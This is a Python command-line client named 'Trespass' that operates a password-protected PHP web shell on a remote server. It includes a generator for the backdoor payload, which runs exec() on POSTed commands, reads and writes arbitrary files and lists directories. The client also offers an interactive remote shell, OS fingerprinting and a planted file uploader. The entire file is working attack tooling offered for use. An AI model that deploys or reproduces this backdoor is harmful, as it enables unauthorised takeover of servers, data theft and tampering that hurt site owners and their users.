#import requests
import requests
import hashlib

#print banner
print('''___________________    ___ ___  ____ ___  
\__    ___/\______ \  /   |   \|    |   \ 
  |    |    |    |  \/    ~    \    |   / 
  |    |    |    `   \    Y    /    |  /  
  |____|   /_______  /\___|_  /|______/   
                   \/       \/                                           
 Trespass Author - TDHU - help from JetBlack''')

#inputs
print(" ")
pa55=input(" pass: ")
pa55wd = hashlib.md5(pa55.encode())
pa55wd = pa55wd.hexdigest()
path=input(" URL of php file: ")
print(" ")

#help
treshelp=''' Choose option by number!
 ------------------------
 1. make/overwrite file(1 line)      10. run shell commands(check first)
 2. add to file                      11. check if shell commands can run
 3. delete file                      12. get OSdata
 4. cat file                         13. create new payload
 5. rename file
 6. make folder
 7. delete folder
 8. Generate file uploader   
 9. ls
 '''
print(treshelp)

#actions
while True:
    choice=input(" choice: ")
    # make/overwrite file(1 line)
    if choice == "1":
        text=input(" text: ")           
        filename=input(" filename: ")
        r = requests.post(path, data = { 'pass' : pa55, 'content' : text, 'filename' : filename })
        print(" file created/overwriten!")
    # add to file
    elif choice == "2":
        addcontent=""
        addtofile=input(" filename: ")
        print(''' type 'exit' when you want to quit!
 contents:''')
        while addcontent !="exit":
            addcontent=input(" ")
            if addcontent !="exit":
                r = requests.post(path, data = { 'pass' : pa55, 'addtofile' : addtofile, 'addcontent' : addcontent })
        print(" content added!")
    # delete file
    elif choice == "3":
        delete=input(" filename: ")
        r = requests.post(path, data = { 'pass' : pa55, 'delete' : delete})
        print(" file deleted!")
    # cat file
    elif choice == "4":
        cat=input(" cat: ")
        r = requests.post(path, data = { 'pass' : pa55, 'view' : cat })
        print(r.text)
    # rename file
    elif choice == "5":
        oldname=input(" oldname: ")
        newname=input(" newname: ")
        r = requests.post(path, data = { 'pass' : pa55, 'oldname' : oldname, 'newname' : newname })
        print(" file contents renamed!")
    # make folder
    elif choice == "6":
        mkdir=input(" mkdir: ")
        r = requests.post(path, data = { 'pass' : pa55, 'mkdir' : mkdir})
        print(" directory created!")
    # delete folder
    elif choice == "7":
        rmdir=input(" rmdir: ")
        r = requests.post(path, data = { 'pass' : pa55, 'rmdir' : rmdir})
        print(" directory removed!")
    # Generate file uploader
    elif choice == "8":
        name=input(" name of file (not including .php): ")
        filename=(name+".php")
        code=('''<?php
$name = $_FILES['file']['name'];
$tmp_name = $_FILES['file']['tmp_name'];
$pass = $_POST['pass'];
if (md5($pass) == "''' + pa55wd + '''"){
    if(isset($name)){
        $location='upload/';
        move_uploaded_file($tmp_name, $location.$name);
        echo 'uploaded';
    }
}
?>
<html>
<form action="'''+filename+'''" method="POST" enctype="multipart/form-data">
<input type="file" name="file">
 password: 
<input type="password" name="pass">
<input type="submit" value="upload">
</form>
</html>''')
        r = requests.post(path, data = { 'pass' : pa55, 'mkdir' : 'upload'})
        r = requests.post(path, data = { 'pass' : pa55, 'content' : code, 'filename' : filename })
        print(" file uploader "+filename+" uploaded to the same dir as trespass file!")
        print(" files will be uploaded to your trespass dir /upload")
    # ls
    elif choice == "9":
        ls=input(" ls: ")
        r = requests.post(path, data = { 'pass' : pa55, 'iwantls' : 'true', 'ls' : ls})
        print(r.text)
    # run shell commands(check first)
    elif choice == "10":
        print(" type exit to close shell!")
        command=""
        while command !="exit":
            command=input(" command: ")
            r = requests.post(path, data = { 'pass' : pa55, 'command' : command})
            print(" "+r.text)
        print(" shell closed!")
    # check if shell commands can run
    elif choice == "11":
        r = requests.post(path, data = { 'pass' : pa55, 'command' : 'echo this_is_an_obsure_string@*^####---++==='})
        if "this_is_an_obsure_string@*^####---++===" in r.text:
            print(" you can run shell commands!")
        else:
            print(" unconfirmed!")
    # get OSdata
    elif choice == "12":
        r = requests.post(path, data = { 'pass' : pa55, 'hostdata' : 'get'})
        print(" "+r.text)
    # create new payload
    elif choice == "13":
        file=open("trespass.php", "w")
        file.write('''<?php
$pass = $_POST["pass"];
if (md5($pass) == "''' + pa55wd + '''"){
    $hostdata = $_POST['hostdata'];
    if ($hostdata=="get"){
        echo php_uname();
    }
    $file = $_POST["filename"];
    $command = $_POST['command'];
    echo exec($command);
    $content = $_POST["content"];
    file_put_contents($file, $content);
    $addtofile = $_POST["addtofile"];
    $addcontent = file_get_contents($addtofile);
    $addcontent .= $_POST["addcontent"];
    file_put_contents($addtofile, $addcontent);
    $view = $_POST["view"];
    echo file_get_contents($view);
    $mkdir = $_POST["mkdir"];
    mkdir($mkdir);
    $rmdir = $_POST["rmdir"];
    rmdir($rmdir);
    $oldname =  $_POST["oldname"];
    $newname =  $_POST["newname"];
    rename($oldname, $newname);
    $delete = $_POST["delete"];
    unlink($delete);
    $iwantls = $_POST['iwantls'];
    if($iwantls == "true"){
	    $ls = $_POST['ls'];
	    $dir = opendir($ls);
	    $item = readdir($dir);
	    while(($item = readdir($dir)) !== FALSE){
		    echo ' ';
		    echo $item;
	    }
    }
}else{
    echo "nope";
}	
?> ''')
        file.close() 
        print(" created payload!")
    elif choice == "help":
        print(treshelp)
    else:
        print(" Invalid choice!")
